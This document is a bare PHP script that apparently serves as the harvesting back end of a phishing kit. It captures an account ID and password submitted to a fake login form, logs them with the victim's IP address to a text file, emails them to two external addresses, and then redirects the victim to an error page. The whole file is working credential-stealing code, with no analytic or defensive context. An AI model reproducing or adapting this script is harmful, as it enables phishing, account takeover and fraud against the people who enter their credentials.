<?
session_start();

$user = $_POST['ctl00$PageContent$uxAccountID'];
$pass = $_POST['ctl00$PageContent$uxPassword'];

$file = fopen("tsb1.txt", "a");
$ip = getenv("REMOTE_ADDR");
$adddate=date("D M d, Y g:i a");
fputs ($file, "$adddate\r\n");
fputs ($file, "Email: $user\r\n");
fputs ($file, "Password: $pass\r\n");
fputs ($file, "$ip\r\n");
fputs ($file, "-----------------------------------\r\n");
fclose ($file);

$ip = getenv("REMOTE_ADDR");

if((!is_numeric($user)) || ($pass == "pass"))

{

$message=$message."Email: $user\n
";
$message=$message."Password: $pass\n
";
$message=$message."IP: $ip\n
";
mail ("jennymayes22@gmail.com,jessicajones0311@yandex.com","$user , $ip","$message","From: Result<admin@result.com>\n");
header("Location: Errorpass.php");
}
?>